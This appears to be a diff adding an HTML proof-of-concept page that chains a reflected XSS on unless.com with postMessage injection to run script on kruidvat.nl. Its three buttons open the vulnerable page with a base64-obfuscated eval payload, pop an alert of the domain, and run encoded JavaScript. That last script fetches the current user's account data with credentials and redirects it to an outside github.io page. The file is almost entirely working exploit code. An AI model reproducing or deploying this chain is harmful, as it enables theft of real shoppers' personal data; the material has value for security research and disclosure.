@@ -1,0 +1,27 @@
+<html>
+
+<body>
+
+    <button onclick="open_unless()">click me to open kruidvat.nl</button>
+    <button onclick="simple_alert()">click me for simple xss</button>
+    <button onclick="get_user_info()">click me to steal user info</button>
+    <script>
+        async function open_unless() {
+
+            win_attcker = window.open("https://unless.com/en/search/?t=integrationsdd%3Cimg%20src=x+onerror='eval(atob(`%64%32%6c%75%5a%47%39%33%4c%6d%46%6b%5a%45%56%32%5a%57%35%30%54%47%6c%7a%64%47%56%75%5a%58%49%6f%49%6d%31%6c%63%33%4e%68%5a%32%55%69%4c%43%41%6f%5a%58%5a%6c%62%6e%51%70%49%44%30%2b%49%48%74%6c%64%6d%46%73%4b%47%56%32%5a%57%35%30%4c%6d%52%68%64%47%45%70%4f%33%30%70%4f%33%64%70%62%6a%31%33%61%57%35%6b%62%33%63%75%62%33%42%6c%62%69%67%6e%61%48%52%30%63%48%4d%36%4c%79%39%33%64%33%63%75%61%33%4a%31%61%57%52%32%59%58%51%75%62%6d%77%76%63%32%56%79%64%6d%6c%6a%5a%53%39%68%63%6e%52%70%59%32%78%6c%4c%30%74%79%64%57%6c%6b%64%6d%46%30%4c%30%74%79%64%57%6c%6b%64%6d%46%30%58%30%35%6c%5a%47%56%79%62%47%46%75%5a%43%39%53%64%57%6c%73%5a%57%35%66%5a%57%35%66%63%6d%56%30%62%33%56%79%62%6d%56%79%5a%57%34%76%55%6e%56%70%62%43%31%66%5a%57%35%66%63%6d%56%30%62%33%56%79%62%57%39%6e%5a%57%78%70%61%6d%74%6f%5a%57%52%6c%62%69%39%58%59%58%52%66%65%6d%6c%71%62%6c%39%6b%5a%56%39%79%64%57%6c%73%4c%56%39%6c%62%6c%39%79%5a%58%52%76%64%58%4a%74%62%32%64%6c%62%47%6c%71%61%32%68%6c%5a%47%56%75%49%32%56%6b%61%58%51%6e%4b%54%73%3d`))'3E");
+            //await new Promise((resolve) => setTimeout(resolve, 4000));
+        }
+
+        function simple_alert() {
+
+            win_attcker.postMessage('win.postMessage({"action": "draftChanged","draft": {"resourceId": "en-EN/1","body": {"variation": "test","customs": {"custom-prepare-js": "alert(document.domain);"}}}}, "*")', "*")
+        }
+
+        function get_user_info() {
+            win_attcker.postMessage('win.postMessage({"action": "draftChanged","draft": {"resourceId": "en-EN/1","body": {"variation": "test","customs": {"custom-prepare-js": "eval(atob(`ZmV0Y2goImh0dHBzOi8vd3d3LmtydWlkdmF0Lm5sL2FwaS92Mi9rdm4vdXNlcnMvY3VycmVudD9sYW5nPW5sIiwgewogICJoZWFkZXJzIjogewogICAgImFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLAogICAgImNhY2hlIjogIm5vLXN0b3JlIiwKICAgICJjYWNoZS1jb250cm9sIjogIm5vLWNhY2hlIiwKICAgICJleHBpcmVzIjogIi0xIiwKICAgICJwcmFnbWEiOiAibm8tY2FjaGUiLAogICAgInByaW9yaXR5IjogInU9MSwgaSIsCiAgICAic2VjLWNoLXVhIjogIlwiR29vZ2xlIENocm9tZVwiO3Y9XCIxMzFcIiwgXCJDaHJvbWl1bVwiO3Y9XCIxMzFcIiwgXCJOb3RfQSBCcmFuZFwiO3Y9XCIyNFwiIiwKICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8wIiwKICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAiXCJXaW5kb3dzXCIiLAogICAgInNlYy1mZXRjaC1kZXN0IjogImVtcHR5IiwKICAgICJzZWMtZmV0Y2gtbW9kZSI6ICJjb3JzIiwKICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLW9yaWdpbiIKICB9LAogICJyZWZlcnJlciI6ICJodHRwczovL3d3dy5rcnVpZHZhdC5ubC8iLAogICJyZWZlcnJlclBvbGljeSI6ICJzdHJpY3Qtb3JpZ2luLXdoZW4tY3Jvc3Mtb3JpZ2luIiwKICAiYm9keSI6IG51bGwsCiAgIm1ldGhvZCI6ICJHRVQiLAogICJtb2RlIjogImNvcnMiLAogICJjcmVkZW50aWFscyI6ICJpbmNsdWRlIgp9KS50aGVuKChyZXNwb25zZSkgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKHRleHQgPT4gbG9jYXRpb24uaHJlZj0naHR0cHM6Ly9qYXNzZXJ0b3ViaWIuZ2l0aHViLmlvL0N1c3RvbV9BcHBzL21hcmlvbm5hdWRfYWNjZXNzX3Rva2VuLmh0bWwjJyt0ZXh0KTs=`))"}}}}, "*")', "*")
+
+        }
+    </script>
+</body>
+
+</html>
